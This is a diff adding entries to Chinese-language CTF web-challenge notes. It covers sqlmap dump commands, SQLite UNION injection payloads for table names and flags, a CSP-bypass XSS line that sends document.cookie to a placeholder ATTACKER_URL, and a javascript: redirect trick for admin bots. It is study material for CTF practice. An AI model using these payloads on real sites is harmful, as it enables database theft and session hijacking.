@@ -2129,6 +2129,12 @@ SELECT * FROM table WHERE column LIKE '%${name}%';
 ```
 数组元素之间会用`,`连接起来。
 - 当sql注入点在url传入的参数且参数是个数组时，可利用sqlmap注入url的数组传参。`sqlmap --url "http://xxx.com/search?name[0]=a&name[1]=2" -p "name[0]" --level 5 --risk 3 --dbms=sqlite --tables -dump`。如果数据库的类型不知道也可以不指定。此为测试语句，当测试出来哪种方法最快时，可以直接对sqlmap指定注入方式(例如union select)。`sqlmap --url "http://xxx.com/search?name[0]=a&name[1]=2" -p "name[0]" --dbms=sqlite --tables --technique=U`
+- sqlite的union联合注入
+    - 查表名：`' UNION SELECT 1, sql FROM sqlite_master WHERE type="table" --`
+    - 查字段：`' UNION SELECT 1, flag FROM table--`
+- [Query Parameterization](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html)可预防sql注入，当题目里出现这些逻辑时就可以放弃考虑sql注入了
 229. [yolo](https://github.com/TJCSec/tjctf-2023-challenges/tree/main/web/yolo),[wp](https://www.youtube.com/watch?v=AqV3YUtcKGU&t=1123s)
 - CSP `script-src 'nonce-test'`指定只有带着`test`的script标签才能执行js。例如`<script>alert(1)</script>`会被浏览器阻挡，但`<script nonce="test">alert(1)</script>`则能执行（因为其指定的nonce值和服务器设置的csp值一致）
 - CSP `default-src 'self'`阻挡了跨域fetch。如当前domain为`http://a.com`，fetch填写的url就只能是这个域名，`fetch("http://b.com")`会被浏览器阻挡。这种情况下的xss可以借助window.location将数据带出到webhook。`<script>window.location =ATTACKER_URL?x=document.cookie</script>`
+230. [complainer](https://github.com/TJCSec/tjctf-2023-challenges/tree/main/web/complainer)
+- 利用url重定向（redirect）实现xss。这题的非预期解在于/login路由会重定向：`/login?next=url`。即使能提交给admin bot的url只能是同域的，但是可以更改重定向的url为`javascript: url`，即可让bot执行任意js代码。
